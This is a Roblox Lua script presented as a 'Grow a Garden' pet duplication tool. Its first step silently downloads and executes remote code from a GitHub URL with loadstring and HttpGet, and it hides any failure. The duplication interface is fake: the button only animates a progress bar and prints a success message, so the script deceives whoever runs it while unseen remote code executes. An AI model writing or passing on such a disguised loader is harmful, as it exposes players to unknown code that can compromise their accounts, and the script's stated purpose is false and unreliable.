-- STEP 1: Load optional external script
local success, err = pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/converterrr/GrowAGardenScript/refs/heads/main/GAG%20GUI"))()
end)
if not success then
    warn("External UI not loaded:", err)
end

-- STEP 2: Setup GUI
local Players = game:GetService("Players")
local player = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
local playerGui = player:WaitForChild("PlayerGui")

-- Remove old GUI
if playerGui:FindFirstChild("FullCoverLoading") then
    playerGui.FullCoverLoading:Destroy()
end

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "FullCoverLoading"
screenGui.IgnoreGuiInset = true
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
screenGui.Parent = playerGui

-- MAIN FRAME
local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 400, 0, 320)
mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
mainFrame.ZIndex = 10
mainFrame.Parent = screenGui

-- TITLE
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 50)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundTransparency = 1
title.Text = "- MZG SCRIPTS GROW A GARDEN\nDUPE SCRIPT -"
title.Font = Enum.Font.GothamBold
title.TextColor3 = Color3.new(1, 1, 1)
title.TextScaled = true
title.TextYAlignment = Enum.TextYAlignment.Center
title.ZIndex = 11
title.Parent = mainFrame

-- SUBTITLE
local subtitle = Instance.new("TextLabel")
subtitle.Size = UDim2.new(1, 0, 0, 25)
subtitle.Position = UDim2.new(0, 0, 0, 50)
subtitle.Text = "SELECT PET TO DUPLICATE"
subtitle.BackgroundTransparency = 1
subtitle.Font = Enum.Font.Gotham
subtitle.TextColor3 = Color3.fromRGB(200, 200, 200)
subtitle.TextScaled = true
subtitle.ZIndex = 11
subtitle.Parent = mainFrame

-- DROPDOWN
local dropdownFrame = Instance.new("Frame")
dropdownFrame.Size = UDim2.new(0.9, 0, 0, 35)
dropdownFrame.Position = UDim2.new(0.05, 0, 0, 80)
dropdownFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
dropdownFrame.ZIndex = 11
dropdownFrame.Parent = mainFrame

local dropdownBox = Instance.new("TextBox")
dropdownBox.Size = UDim2.new(1, 0, 1, 0)
dropdownBox.BackgroundTransparency = 1
dropdownBox.Text = "Enter pet name..."
dropdownBox.ClearTextOnFocus = false
dropdownBox.Font = Enum.Font.Gotham
dropdownBox.TextColor3 = Color3.fromRGB(200, 200, 200)
dropdownBox.TextScaled = true
dropdownBox.ZIndex = 12
dropdownBox.Parent = dropdownFrame

local dropdownList = Instance.new("ScrollingFrame")
dropdownList.Size = UDim2.new(1, 0, 0, 120)
dropdownList.Position = UDim2.new(0, 0, 1, 0)
dropdownList.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
dropdownList.ScrollBarThickness = 4
dropdownList.Visible = false
dropdownList.ZIndex = 12
dropdownList.Parent = dropdownFrame

local UIListLayout = Instance.new("UIListLayout")
UIListLayout.Parent = dropdownList
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

-- PET LIST
local petList = {
    "Bunny", "Dog", "Golden Lab", "Starfish", "Crab", "Seagull", "Black Bunny", "Cat",
    "Chicken", "Deer", "Bee", "Hedgehog", "Kiwi", "Monkey", "Orange Tabby", "Pig", "Rooster",
    "Spotted Deer", "Honey Bee", "Wasp", "Flamingo", "Toucan", "Orangutan", "Sea Turtle", "Seal",
    "Blood Hedgehog", "Blood Kiwi", "Cow", "Scarlet Macaw", "Ostrich", "Frog", "Mole", "Moon Cat",
    "Panda", "Polar Bear", "Sea Otter", "Silver Monkey", "Turtle", "Firefly", "Tarantula Hawk",
    "Petal Bee", "Peacock", "Moth", "Capybara", "Brown Mouse", "Caterpillar", "Echo Frog",
    "Giant Ant", "Grey Mouse", "Owl", "Praying Mantis", "Red Fox", "Red Giant Ant", "Snail",
    "Squirrel", "Chicken Zombie", "Bear Bee", "Butterfly", "Pack Bee", "Cooked Owl", "Mimic Octopus",
    "Blood Owl", "Dragonfly", "Night Owl", "Raccoon", "Queen Bee", "Disco Bee"
}

local selectedPet = nil

local function updateDropdown(filter)
    dropdownList:ClearAllChildren()
    for _, pet in ipairs(petList) do
        if not filter or pet:lower():find(filter:lower()) then
            local btn = Instance.new("TextButton")
            btn.Size = UDim2.new(1, 0, 0, 30)
            btn.BackgroundTransparency = 1
            btn.Text = pet
            btn.Font = Enum.Font.Gotham
            btn.TextColor3 = Color3.new(1, 1, 1)
            btn.TextScaled = true
            btn.ZIndex = 13
            btn.Parent = dropdownList
            btn.MouseButton1Click:Connect(function()
                dropdownBox.Text = pet
                selectedPet = pet
                dropdownList.Visible = false
            end)
        end
    end
end

dropdownBox.Focused:Connect(function()
    updateDropdown(dropdownBox.Text)
    dropdownList.Visible = true
end)

dropdownBox:GetPropertyChangedSignal("Text"):Connect(function()
    updateDropdown(dropdownBox.Text)
end)

dropdownBox.FocusLost:Connect(function()
    wait(0.1)
    dropdownList.Visible = false
end)

-- COUNTER
local count = 1

local minusBtn = Instance.new("TextButton")
minusBtn.Size = UDim2.new(0, 40, 0, 40)
minusBtn.Position = UDim2.new(0.05, 0, 0, 130)
minusBtn.BackgroundColor3 = Color3.fromRGB(200, 30, 30)
minusBtn.Text = "-"
minusBtn.Font = Enum.Font.GothamBold
minusBtn.TextColor3 = Color3.new(1, 1, 1)
minusBtn.TextScaled = true
minusBtn.ZIndex = 11
minusBtn.Parent = mainFrame

local plusBtn = Instance.new("TextButton")
plusBtn.Size = UDim2.new(0, 40, 0, 40)
plusBtn.Position = UDim2.new(0.75, 0, 0, 130)
plusBtn.BackgroundColor3 = Color3.fromRGB(30, 200, 30)
plusBtn.Text = "+"
plusBtn.Font = Enum.Font.GothamBold
plusBtn.TextColor3 = Color3.new(1, 1, 1)
plusBtn.TextScaled = true
plusBtn.ZIndex = 11
plusBtn.Parent = mainFrame

local countLabel = Instance.new("TextLabel")
countLabel.Size = UDim2.new(0.4, 0, 0, 40)
countLabel.Position = UDim2.new(0.5, -50, 0, 130)
countLabel.BackgroundTransparency = 1
countLabel.Text = tostring(count)
countLabel.Font = Enum.Font.GothamBold
countLabel.TextColor3 = Color3.new(1, 1, 1)
countLabel.TextScaled = true
countLabel.ZIndex = 11
countLabel.Parent = mainFrame

minusBtn.MouseButton1Click:Connect(function()
    if count > 1 then
        count -= 1
        countLabel.Text = tostring(count)
    end
end)

plusBtn.MouseButton1Click:Connect(function()
    count += 1
    countLabel.Text = tostring(count)
end)

-- DUPLICATE BUTTON
local startBtn = Instance.new("TextButton")
startBtn.Size = UDim2.new(0.9, 0, 0, 40)
startBtn.Position = UDim2.new(0.05, 0, 0, 190)
startBtn.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
startBtn.Text = "DUPLICATE PET"
startBtn.Font = Enum.Font.GothamBold
startBtn.TextColor3 = Color3.new(1, 1, 1)
startBtn.TextScaled = true
startBtn.ZIndex = 11
startBtn.Parent = mainFrame

-- LOADING SCREEN
local loading = Instance.new("Frame")
loading.Size = UDim2.new(1, 0, 1, 0)
loading.BackgroundColor3 = Color3.new(0, 0, 0)
loading.Visible = false
loading.ZIndex = 999
loading.Parent = screenGui

local loadingFrame = Instance.new("Frame")
loadingFrame.Size = UDim2.new(0, 350, 0, 60)
loadingFrame.Position = UDim2.new(0.5, -175, 0.5, -30)
loadingFrame.AnchorPoint = Vector2.new(0.5, 0.5)
loadingFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
loadingFrame.ZIndex = 1000
loadingFrame.Parent = loading

local loadingLabel = Instance.new("TextLabel")
loadingLabel.Size = UDim2.new(1, 0, 0, 30)
loadingLabel.Text = "DUPLICATING SELECTED PETS"
loadingLabel.TextColor3 = Color3.new(1, 1, 1)
loadingLabel.Font = Enum.Font.GothamBold
loadingLabel.TextScaled = true
loadingLabel.BackgroundTransparency = 1
loadingLabel.ZIndex = 1001
loadingLabel.Parent = loadingFrame

local progressBarBG = Instance.new("Frame")
progressBarBG.Size = UDim2.new(0.9, 0, 0, 18)
progressBarBG.Position = UDim2.new(0.05, 0, 0, 35)
progressBarBG.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
progressBarBG.ZIndex = 1002
progressBarBG.Parent = loadingFrame

local progressBar = Instance.new("Frame")
progressBar.Size = UDim2.new(0, 0, 1, 0)
progressBar.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
progressBar.ZIndex = 1003
progressBar.Parent = progressBarBG

-- BUTTON LOGIC
startBtn.MouseButton1Click:Connect(function()
    if not selectedPet then
        dropdownBox.Text = "Please select a pet!"
        return
    end

    -- Hide main GUI, show loading
    mainFrame.Visible = false
    loading.Visible = true
    progressBar.Size = UDim2.new(0, 0, 1, 0)

    -- Animate progress bar
    for i = 1, 100 do
        progressBar.Size = UDim2.new(i / 100, 0, 1, 0)
        wait(0.02)
    end

    wait(0.3)

    -- Close everything
    screenGui:Destroy()

    -- Console log
    print("âœ… Duplicated", count, selectedPet)
end)
